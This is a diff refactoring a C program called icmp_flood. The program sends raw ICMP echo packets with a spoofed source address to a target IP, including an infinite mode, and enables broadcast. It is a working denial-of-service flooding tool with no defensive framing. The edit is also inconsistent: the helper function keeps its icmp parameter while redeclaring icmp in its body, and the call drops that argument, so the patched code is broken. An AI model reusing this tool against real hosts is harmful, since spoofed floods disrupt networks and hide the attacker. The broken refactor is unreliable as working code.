@@ -11,17 +11,18 @@
 #include <arpa/inet.h>
  
 #define BUFFER_SIZE 400
-#define PACKET_DELAY_USEC 30
-#define DEF_NUM_PACKETS 100
+#define PACKET_DELAY 30
+#define PACK_NUM 100
+#define THREAD_NUM 100
  
-char buf[BUFFER_SIZE];
+static char buf[BUFFER_SIZE];
  
-char *usage = "\nUsage: ./icmp_flood <saddr> <daddr> <# packets>\n \
+static char *usage = "\nUsage: ./icmp_flood <saddr> <daddr> <# packets>\n \
 	<saddr> = spoofed source address\n \
 	<daddr> = target IP address\n \
 	<# packets> = is the number of packets to send, 100 is the default, 0 = infinite\n";
  
-void set_ip_layer_fields(struct icmphdr *icmp, struct ip *ip)
+static void set_ip_layer_fields(struct icmphdr *icmp, struct ip *ip)
 {
     // IP Layer
     ip->ip_v = 4;
@@ -35,23 +36,24 @@ void set_ip_layer_fields(struct icmphdr *icmp, struct ip *ip)
     ip->ip_sum = 0; /* Let kernel fill in */
  
     // ICMP Layer
+    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
     icmp->type = ICMP_ECHO;
     icmp->code = 0;	
     icmp->checksum = htons(~(ICMP_ECHO << 8));	
 }
  
-void set_socket_options(int s)
+static void set_socket_options(int sockfd)
 {
-    int on = 1;
+    const int on = 1;
  
     // Enable broadcast
-    if(setsockopt(s, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0){
+    if(setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0){
         perror("setsockopt() for BROADCAST error");
         exit(1);
     }
  
     // socket options, tell the kernel we provide the IP structure 
-    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
         perror("setsockopt() for IP_HDRINCL error");
         exit(1);
     }	
@@ -59,13 +61,13 @@ void set_socket_options(int s)
  
 int main(int argc, char *argv[])
 {
-    int s, i;	
+    int sockfd, i;	
     struct ip *ip = (struct ip *)buf;
-    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
+    
     struct hostent *hp, *hp2;
     struct sockaddr_in dst;
     int offset;
-    int num = DEF_NUM_PACKETS;
+    int num = PACK_NUM;
  
     if(argc < 3){
         fprintf(stdout, "%s\n",usage);
@@ -82,12 +84,12 @@ int main(int argc, char *argv[])
         memset(buf, 0, sizeof(buf));
  
         // Create RAW socket 
-        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+        if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
             perror("socket() error");
             exit(1);
         }
  
-        set_socket_options(s);
+        set_socket_options(sockfd);
  
         if((hp = gethostbyname(argv[2])) == NULL){
             if((ip->ip_dst.s_addr = inet_addr(argv[2])) == -1){
@@ -105,19 +107,19 @@ int main(int argc, char *argv[])
         }else
             memcpy(&ip->ip_src.s_addr, hp2->h_addr_list[0], hp->h_length);
  
-        set_ip_layer_fields(icmp, ip);
+        set_ip_layer_fields(ip);
  
         dst.sin_addr = ip->ip_dst;
         dst.sin_family = AF_INET;
  
-        if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
+        if(sendto(sockfd, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
             fprintf(stderr, "Error during packet send.\n");
             perror("sendto() error");
         }else
             printf("sendto() is OK.\n");
  
-        close(s);
-        usleep(PACKET_DELAY_USEC);
+        close(sockfd);
+        usleep(PACKET_DELAY);
     }
     return 0;
 }
